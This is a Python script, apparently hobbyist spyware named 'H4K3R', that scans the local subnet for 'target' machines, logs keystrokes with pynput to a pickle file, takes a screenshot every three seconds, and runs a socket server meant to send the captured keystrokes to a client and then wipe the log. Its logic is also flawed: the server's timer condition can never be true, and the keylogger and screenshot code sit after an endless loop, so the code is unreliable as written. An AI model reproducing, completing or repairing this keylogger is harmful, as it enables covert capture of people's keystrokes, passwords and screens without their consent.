# ==================== H4K3R.py ====================
import pickle
import socket
import os
from pynput import keyboard
import mss
import time
import threading
import ipaddress
# ==================== Imports ====================
def get_local_network():
    """Get local network subnet"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    print(f"Your IP: {local_ip}")
    return ipaddress.IPv4Network(f"{local_ip}/24", strict=False), local_ip

def check_ip(ip, port, results, local_ip):
    """Check single IP for open port and verify with handshake"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((str(ip), port)) == 0:
            try:
                # Send verification message
                sock.sendall(b"I<3CatsCauseTheyAreReallyCute")
                sock.settimeout(1)
                response = sock.recv(1024).decode('utf-8')
                print(f"✅ Found: {ip}")
                print(f"   Response: {response}")
                results.append((str(ip), response))
            except Exception as e:
                print(f"   (Connected but handshake failed: {e})")
                results.append((str(ip), "Handshake failed"))
        sock.close()
    except:
        pass

def fast_scan(network, local_ip, port=8888):
    """Fast threaded scan"""
    print(f"Scanning {network} for port {port}...")
    results = []
    threads = []
    ips_to_scan = list(network.hosts()) + [ipaddress.IPv4Address('127.0.0.1'), ipaddress.IPv4Address(local_ip)]
    for ip in ips_to_scan:
        thread = threading.Thread(target=check_ip, args=(ip, port, results, local_ip))
        threads.append(thread)
        thread.start()
        if len(threads) >= 50:
            for t in threads:
                t.join()
            threads = []
    for t in threads:
        t.join()
    return results

def quick_test():
    """Test if we can connect to ourselves and verify handshake"""
    print("Testing self-connection...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('127.0.0.1', 8888))
        if result == 0:
            try:
                sock.sendall(b"I<3CatsCauseTheyAreReallyCute")
                response = sock.recv(1024).decode('utf-8')
                print("✅ Self-test passed - server is running and handshake succeeded")
                sock.close()
                return True
            except Exception as e:
                print(f"❌ Self-test failed - handshake error: {e}")
                sock.close()
                return False
        else:
            print("❌ Self-test failed - no server on port 8888")
            sock.close()
            return False
    except Exception as e:
        print(f"❌ Self-test error: {e}")
        return False

def run_network_scan():
    """Main function to run the network scan - returns results"""
    print("🔍 Starting network discovery...")
    if not quick_test():
        print("\n⚠️  No server detected on port 8888")
        print("💡 Make sure target computer is running the server")
        return []
    network, local_ip = get_local_network()
    start_time = time.time()
    devices = fast_scan(network, local_ip)
    scan_time = time.time() - start_time
    print(f"\n📊 Scan completed in {scan_time:.1f} seconds")
    print(f"Found {len(devices)} devices:")
    for ip, response in devices:
        print(f"  {ip}: {response[:30]}...")
    return devices

if __name__ == "__main__":
    devices = run_network_scan()
    print("\n🔄 Network scan complete, continuing with rest of program...")
    print(f"Discovered {len(devices)} target devices")
    # Your larger program would continue here...

Clock = time.time()
# Setup
folder = os.path.join(os.path.expanduser("~"), "my_app_data")
os.makedirs(folder, exist_ok=True)
file_path = os.path.join(folder, "data.pkl")

# Load
if os.path.exists(file_path):
    with open(file_path, "rb") as f:
        data = pickle.load(f)
else:
    data = ""
# Save
with open(file_path, "wb") as f:
    pickle.dump(data, f)

def on_press(key):
    global data
    if key == keyboard.Key.backspace:
        data = data[:-1]     # Remove last character
    elif key == keyboard.Key.esc:
        print("Exiting...")
        # Save data before exiting
        print(data)
        with open(file_path, "wb") as f:
            pickle.dump(data, f)
        return False
    else:
        try:
            data += key.char if hasattr(key, 'char') and key.char else ''
        except AttributeError:
            pass

def take_screenshots_interval(interval=3, save_dir='.'):
    os.makedirs(save_dir, exist_ok=True)  # Ensure directory exists
    count = 1
    with mss.mss() as sct:
        while True:
            filename = os.path.join(save_dir, f'screenshot_{count}.png')
            sct.shot(output=filename)
            print(f"Screenshot taken and saved as {filename}")
            count += 1
            time.sleep(interval)
# create an INET, STREAMing socket
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# bind the socket to a public host, and a well-known port
serversocket.bind(("127.0.0.1", 12345))
# become a server socket
serversocket.listen(5)

while True:
    if Clock > Clock + 600:
        Clock = time.time()  # Reset the timer
        # accept connections from outside
        print("Accepting connections...")
        (client, address) = serversocket.accept()
        print("Sending file contents to client...")
        # Read the entire content of file_path
        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                file_content = f.read()
        else:
            file_content = b""
        # Send the file content
        client.sendall(file_content)
        print("File content sent. Deleting file contents...")
        # Delete all contents of file_path
        with open(file_path, "wb") as f:
            f.truncate(0)
        print("File contents deleted. Closing connection...")
        client.close()
# ==================== Functions ====================
# Change directory to your desired path
screenshot_dir = folder

screenshot_thread = threading.Thread(
    target=take_screenshots_interval, args=(3, screenshot_dir), daemon=True)
screenshot_thread.start()

# ==================== Threading ====================

listener = keyboard.Listener(on_press=on_press) 
listener.start()
listener.join()

# ==================== Function Calling ====================
